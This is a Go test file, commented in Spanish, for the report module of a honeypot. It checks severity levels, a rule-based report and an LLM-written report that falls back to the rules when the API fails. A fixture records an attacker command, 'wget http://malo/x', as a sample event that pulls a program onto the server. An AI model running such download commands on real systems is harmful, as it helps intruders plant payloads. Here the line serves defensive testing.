package report

import (
	"context"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/anthropics/anthropic-sdk-go"
	"github.com/anthropics/anthropic-sdk-go/option"

	"github.com/k0braintheworld/k0pot/internal/model"
	"github.com/k0braintheworld/k0pot/internal/store"
)

func datosVacios() Datos {
	return Datos{Resumen: &store.Resumen{}, Niveles: map[model.Clasificacion]int{}}
}

func datosDePrueba() Datos {
	ahora := time.Now()
	return Datos{
		Desde: ahora.AddDate(0, 0, -7),
		Hasta: ahora,
		Resumen: &store.Resumen{
			Total: 100, IPsUnicas: 12,
			PorTipo:     []store.Recuento{{Valor: "login_fallido", N: 90}},
			PorPais:     []store.Recuento{{Valor: "CN", N: 60}, {Valor: "RU", N: 30}},
			TopUsuarios: []store.Recuento{{Valor: "root", N: 50}},
			TopIPs: []store.IPActiva{{
				Origen: model.Origen{
					IP: "185.220.101.1", Pais: "DE", ISP: "Ejemplo",
					Reputacion: 100, TotalReportes: 500, Tor: true, Enriquecido: true,
				},
				Eventos: 40,
			}},
		},
		Niveles: map[model.Clasificacion]int{
			model.RuidoFondo: 97, model.Revisar: 2, model.Notable: 1,
		},
		Destacados: []store.Destacado{{
			Timestamp: ahora, IP: "185.220.101.1", Pais: "DE",
			Clasificacion: model.Notable,
			Motivo:        "ejecuto comandos para traerse programas de fuera al servidor",
			Detalle:       map[string]string{"comando": "wget http://malo/x"},
		}},
	}
}

// El semaforo es la linea mas importante del producto: si no pasa nada
// tiene que decirlo, y un solo evento notable manda sobre todo lo demas.
func TestSemaforo(t *testing.T) {
	casos := []struct {
		nombre  string
		niveles map[model.Clasificacion]int
		espera  Nivel
	}{
		{"sin nada", map[model.Clasificacion]int{}, Verde},
		{"solo ruido", map[model.Clasificacion]int{model.RuidoFondo: 9999}, Verde},
		{"algo que revisar", map[model.Clasificacion]int{model.RuidoFondo: 100, model.Revisar: 1}, Ambar},
		{"un notable manda", map[model.Clasificacion]int{model.RuidoFondo: 9999, model.Notable: 1}, Rojo},
		{"notable pesa mas que revisar", map[model.Clasificacion]int{model.Revisar: 50, model.Notable: 1}, Rojo},
	}
	for _, c := range casos {
		if got := NivelDe(c.niveles); got != c.espera {
			t.Errorf("%s: nivel = %q, esperaba %q", c.nombre, got, c.espera)
		}
	}
}

func TestFraseVerdeTranquiliza(t *testing.T) {
	f := FraseSemaforo(map[model.Clasificacion]int{model.RuidoFondo: 5000})
	for _, esperado := range []string{"VERDE", "no hay nada que requiera tu atencion"} {
		if !strings.Contains(f, esperado) {
			t.Errorf("frase = %q, esperaba que contuviera %q", f, esperado)
		}
	}
}

func TestFraseSingularYPlural(t *testing.T) {
	uno := FraseSemaforo(map[model.Clasificacion]int{model.Notable: 1})
	if !strings.Contains(uno, "1 evento ") {
		t.Errorf("frase = %q, esperaba singular", uno)
	}
	varios := FraseSemaforo(map[model.Clasificacion]int{model.Notable: 3})
	if !strings.Contains(varios, "3 eventos") {
		t.Errorf("frase = %q, esperaba plural", varios)
	}
}

func TestPorReglasSinActividad(t *testing.T) {
	res, err := PorReglas{}.Generar(context.Background(), Datos{
		Resumen: &store.Resumen{}, Niveles: map[model.Clasificacion]int{},
	})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(res.Texto, "VERDE") || !strings.Contains(res.Texto, "Sin actividad") {
		t.Errorf("texto = %q", res.Texto)
	}
	if res.Redactado != "reglas" {
		t.Errorf("redactado = %q", res.Redactado)
	}
}

func TestPorReglasIncluyeLoEsencial(t *testing.T) {
	res, err := PorReglas{}.Generar(context.Background(), datosDePrueba())
	if err != nil {
		t.Fatal(err)
	}
	for _, esperado := range []string{"ROJO", "100 eventos", "ruido de fondo", "traerse programas"} {
		if !strings.Contains(res.Texto, esperado) {
			t.Errorf("el informe no menciona %q:\n%s", esperado, res.Texto)
		}
	}
}

// servidorFalso apunta el cliente a un servidor de pruebas.
func conServidor(t *testing.T, h http.HandlerFunc) *ConLLM {
	t.Helper()
	srv := httptest.NewServer(h)
	t.Cleanup(srv.Close)
	return &ConLLM{
		Cliente: anthropic.NewClient(
			option.WithAPIKey("clave-de-prueba"),
			option.WithBaseURL(srv.URL),
			option.WithMaxRetries(0),
		),
		Modelo:   ModeloPorDefecto,
		Respaldo: PorReglas{},
		Plazo:    5 * time.Second,
	}
}

func TestConLLMDevuelveElTextoDelModelo(t *testing.T) {
	g := conServidor(t, func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.Write([]byte(`{"id":"msg_1","type":"message","role":"assistant",
		 "model":"claude-opus-4-8","stop_reason":"end_turn",
		 "content":[{"type":"text","text":"Esta semana no ha pasado nada preocupante."}],
		 "usage":{"input_tokens":10,"output_tokens":5}}`))
	})

	res, err := g.Generar(context.Background(), datosDePrueba())
	if err != nil {
		t.Fatal(err)
	}
	if res.Texto != "Esta semana no ha pasado nada preocupante." {
		t.Errorf("texto = %q", res.Texto)
	}
	if !strings.HasPrefix(res.Redactado, "llm:") {
		t.Errorf("redactado = %q, esperaba que citara al modelo", res.Redactado)
	}
}

// Lo mas importante de todo: si la API falla, el informe se entrega igual.
// Un honeypot que deja de informar porque un servicio externo se cayo no
// sirve para nada.
func TestConLLMCaeEnReglasSiFallaLaAPI(t *testing.T) {
	for _, codigo := range []int{401, 429, 500} {
		g := conServidor(t, func(w http.ResponseWriter, r *http.Request) {
			w.WriteHeader(codigo)
			w.Write([]byte(`{"type":"error","error":{"type":"api_error","message":"vaya"}}`))
		})

		res, err := g.Generar(context.Background(), datosDePrueba())
		if err != nil {
			t.Fatalf("HTTP %d: no deberia propagar el error: %v", codigo, err)
		}
		if !strings.Contains(res.Texto, "ROJO") {
			t.Errorf("HTTP %d: no se genero el informe de respaldo:\n%s", codigo, res.Texto)
		}
		// Atribuir al LLM un texto que escribieron las reglas seria
		// mentirle a quien lee el informe.
		if !strings.HasPrefix(res.Redactado, "reglas") {
			t.Errorf("HTTP %d: redactado = %q, esperaba que dijera que fueron las reglas",
				codigo, res.Redactado)
		}
	}
}

func TestConLLMCaeEnReglasSiElTextoLlegaVacio(t *testing.T) {
	g := conServidor(t, func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.Write([]byte(`{"id":"msg_1","type":"message","role":"assistant",
		 "model":"claude-opus-4-8","stop_reason":"end_turn","content":[],
		 "usage":{"input_tokens":10,"output_tokens":0}}`))
	})

	res, err := g.Generar(context.Background(), datosDePrueba())
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(res.Texto, "ROJO") {
		t.Errorf("no se genero el informe de respaldo:\n%s", res.Texto)
	}
	if !strings.HasPrefix(res.Redactado, "reglas") {
		t.Errorf("redactado = %q, esperaba que dijera que fueron las reglas", res.Redactado)
	}
}

// Sin eventos no hay nada que interpretar: llamar a la API seria gastar
// dinero para que el modelo diga que no hay datos.
func TestConLLMNoLlamaSiNoHayActividad(t *testing.T) {
	var llamadas int
	g := conServidor(t, func(w http.ResponseWriter, r *http.Request) {
		llamadas++
		w.Write([]byte(`{}`))
	})

	_, err := g.Generar(context.Background(), Datos{
		Resumen: &store.Resumen{}, Niveles: map[model.Clasificacion]int{},
	})
	if err != nil {
		t.Fatal(err)
	}
	if llamadas != 0 {
		t.Errorf("se hicieron %d llamadas a la API sin datos que resumir", llamadas)
	}
}

// El prompt lleva agregados, nunca el log en bruto.
func TestDatosComoTextoLlevaElContexto(t *testing.T) {
	texto := datosComoTexto(datosDePrueba())
	for _, esperado := range []string{
		"ruido de fondo: 97", "notables: 1", "185.220.101.1",
		"nodo de salida TOR", "reputacion 100/100", "wget http://malo/x",
	} {
		if !strings.Contains(texto, esperado) {
			t.Errorf("el prompt no incluye %q:\n%s", esperado, texto)
		}
	}
}

// Un codigo de estado a secas no ayuda a nadie: un 400 puede ser una
// peticion mal formada o el saldo agotado. El log tiene que decir cual.
func TestExplicarRescataElMensajeDeLaAPI(t *testing.T) {
	g := conServidor(t, func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(400)
		w.Write([]byte(`{"type":"error","error":{"type":"invalid_request_error",
		 "message":"Your credit balance is too low to access the Anthropic API."}}`))
	})

	_, err := g.Cliente.Messages.New(context.Background(), anthropic.MessageNewParams{
		Model:     ModeloPorDefecto,
		MaxTokens: 16,
		Messages:  []anthropic.MessageParam{anthropic.NewUserMessage(anthropic.NewTextBlock("hola"))},
	})
	if err == nil {
		t.Fatal("esperaba error")
	}

	explicacion := explicar(err)
	if !strings.Contains(explicacion, "credit balance") {
		t.Errorf("explicacion = %q, esperaba que citara el motivo de la API", explicacion)
	}
	if !strings.Contains(explicacion, "400") {
		t.Errorf("explicacion = %q, esperaba que citara el codigo", explicacion)
	}
}
